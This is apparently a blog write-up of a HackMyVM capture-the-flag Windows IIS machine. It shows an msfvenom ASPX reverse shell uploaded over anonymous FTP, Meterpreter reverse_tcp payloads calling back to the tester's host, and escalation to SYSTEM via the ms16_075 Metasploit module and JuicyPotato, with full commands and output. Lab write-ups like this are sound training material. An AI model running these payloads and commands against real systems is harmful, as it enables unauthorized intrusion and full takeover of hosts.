@@ -1,0 +1,238 @@
+---
+title: Quoted
+date: '2025-03-09'
+description: ''
+type: writeup
+platform: hackmyvm
+tags:
+  - FTP
+  - IIS
+  - Msfvenom
+  - REV-SHELL
+  - WINDOWS
+cover: /mc/uploads/2025/03/Microsoft_IIS-1200x650-optimized.webp
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+Hi , today we are going to try to pwn a Windows machine From HackmyVM, i will explain every step clearly so you can follow along and see how we go from scanning the machine to gaining full control as the “SYSTEM” user.
+
+## enumerate Nmap
+
+we gonna use Nmap to see open ports
+
+```bash
+nmap -sV 192.168.56.123 -A   
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-09 16:10 +00
+Nmap scan report for 192.168.56.123
+Host is up (0.00061s latency).
+Not shown: 988 closed tcp ports (reset)
+
+PORT      STATE SERVICE      VERSION
+21/tcp    open  ftp          Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 10-05-24  11:16AM                 aspnet_client
+| 10-04-24  11:27PM                  689 iisstart.htm
+|_10-04-24  11:27PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http         Microsoft IIS httpd 7.5
+|_http-server-header: Microsoft-IIS/7.5
+
+```
+the results of nmap shows that there is a Open ports as LDAP , SMB , and FTP , HTTP , so the FTP , looks like we can authenticate as anoonymous
+
+## enumerate FTP and HTTP
+
+First, let’s visit the web server by typing **http://192.168.56.123** into a browser. just an image of IIS
+
+[![](https://nutzh.top/wp-content/uploads/2025/03/Screenshot-2025-03-09-161442.png)](https://nutzh.top/wp-content/uploads/2025/03/Screenshot-2025-03-09-161442.png)We see a page with an image called welcome.png. To dig deeper, we right-click the page, select “View Page Source,” and find this code:
+
+
+div id="container">
+a href="http://go.microsoft.com/fwlink/?linkid=66138&clcid=0x409">img src="welcome.png" alt="IIS7" width="571" height="411" />a>
+div>
+```text
+
+The image welcome.png is loaded directly from the server’s file system. This is interesting because the FTP server also lists welcome.png when we explore it later. This suggests the web server and FTP server might share the same directory. If true, we could upload a file via FTP and then access it through the web server—potentially running our own code on the machine.
+
+Since FTP allows anonymous login, let’s connect to it using a tool called lftp:
+
+```
+lftp 192.168.56.123 -u anonymous
+Password: #anonymous
+```bash
+So we log in , and once inside, we can upload files. Our plan is to create a **reverse shell**—. We’ll use **msfvenom**, a tool from the Metasploit framework, to make this payload:
+
+```
+$ msfvenom -p windows/x64/shell_reverse_tcp lhost=$IP lport=1234 -a x64 --platform Windows -f aspx -o reverse.aspx
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of aspx file: 3416 bytes
+Saved as: reverse.aspx
+```bash
+- -f aspx: Makes it an ASPX file (a web page that can run code on IIS).
+
+send the reverse file via FTP:
+
+```
+lftp anonymous@192.168.56.123:~> put reverse.aspx
+3416 bytes transferred                                            
+lftp anonymous@192.168.56.123:/> dir
+10-05-24  11:16AM                 aspnet_client
+10-04-24  11:27PM                  689 iisstart.htm
+03-09-25  06:26PM                 3416 reverse.aspx
+10-04-24  11:27PM               184946 welcome.png
+lftp anonymous@192.168.56.123:/>
+```bash
+## Foothold
+
+Before triggering our payload, we need to listen for the connection. We use **socat** (you could also use nc), and go to **http://192.168.56.123/reverse.aspx**
+
+```
+socat TCP-LISTEN:1234 -         
+Microsoft Windows [S�r�m 6.1.7601]
+Telif Hakk� (c) 2009 Microsoft Corporation. T�m haklar� sakl�d�r.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+nt authority\network service
+```bash
+We’re in as “NETWORK SERVICE,” a low-privilege account. Our goal is to escalate to “SYSTEM,” the highest privilege level. so gonna create another shell and its **Meterpreter** shell, which gives us more tools. Create a new payload:
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=4444 -f exe > payload.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of exe file: 73802 bytes
+```bash
+Start Metasploit and set up a listener:
+
+```
+msfconsole -q                                                                                                               
+msf6 > use exploit/multi/handler
+msf6 exploit(multi/handler) > set LHOST $YOUR-IP
+msf6 exploit(multi/handler) > set LPORT 4444 # the same u used for msfvenom
+msf6 exploit(multi/handler) > run
+```bash
+Upload payload.exe via FTP:
+
+```
+lftp anonymous@192.168.56.123:/> put payload.exe 
+73802 bytes transferred
+```bash
+From the existing shell, run it:
+
+```
+c:\inetpub\wwwroot>payload.exe
+```bash
+Metasploit shows a new session:
+
+```
+msf6 exploit(multi/handler) > run 
+[*] Started reverse TCP handler on 192.168.56.105:4444 
+[*] Sending stage (177734 bytes) to 192.168.56.123
+[*] Meterpreter session 1 opened (192.168.56.105:4444 -> 192.168.56.123:49161) at 2025-03-09 16:55:51 +0000
+
+meterpreter > getuid
+Server username: NT AUTHORITY\NETWORK SERVICE
+```bash
+we gonna check the privileges of the user
+
+```
+meterpreter > getprivs
+                                                                                                                                                                       
+Enabled Process Privileges                                                                                                                                             
+==========================                                                                                                                                             
+
+Name
+----
+SeAssignPrimaryTokenPrivilege
+SeAuditPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeImpersonatePrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+```bash
+**SeImpersonatePrivilege** is the vulrebility —it lets us impersonate other users, like SYSTEM.
+
+## Priv esc
+
+### Escalating to SYSTEM with Metasploit
+
+we are going to put the session in the background and use the exploit suggester to see if there is some vulnerabilities
+
+```
+meterpreter > background 
+[*] Backgrounding session 1...
+msf6 post(windows/gather/enum_patches) > use exploit/multi/handler
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > run
+```bash
+It lists all the potential vulnerabilities, including **ms16\_075\_reflection\_juicy**. Let’s use it:
+
+```
+msf6 > use exploit/windows/local/ms16_075_reflection_juicy
+msf6 exploit(windows/local/ms16_075_reflection_juicy) > set session 1
+msf6 exploit(windows/local/ms16_075_reflection_juicy) > set LHOST 192.168.56.105
+msf6 exploit(windows/local/ms16_075_reflection_juicy) > exploit 
+[*] Started reverse TCP handler on 192.168.56.105:4444 
+[+] Target appears to be vulnerable (Windows 7 Service Pack 1)
+[*] Launching notepad to host the exploit...
+[+] Process 2500 launched.
+[*] Reflectively injecting the exploit DLL into 2500...
+[*] Injecting exploit into 2500...
+[*] Exploit injected. Injecting exploit configuration into 2500...
+[*] Configuration injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (177734 bytes) to 192.168.56.123
+[*] Meterpreter session 2 opened (192.168.56.105:4444 -> 192.168.56.123:49176) 
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```bash
+### Method with Juicy Potato
+
+Another way to exploit **SeImpersonatePrivilege** is with **Juicy Potato**. Download it from [GitHub](https://github.com/ohpe/juicy-potato), then upload it .  
+Set up the Metasploit listener again:
+
+```
+msf6 > use exploit/multi/handler
+msf6 exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(handler) > set LHOST 
+msf6 exploit(handler) > set LPORT 4444
+msf6 exploit(handler) > exploit
+```bash
+Use Juicy Potato to execute your payload with SYSTEM privileges:
+
+```
+c:\inetpub\wwwroot>JuicyPotato.exe -l 1234 -p c:\inetpub\wwwroot\Payload.exe -t *
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1234
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+```bash
+Metasploit catches it:
+
+```
+[*] Started reverse TCP handler on 192.168.56.105:4444 
+[*] Sending stage (177734 bytes) to 192.168.56.123
+[*] Meterpreter session 4 opened (192.168.56.105:4444 -> 192.168.56.123:49205) 
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```text
+**ROOTED**
+
+```
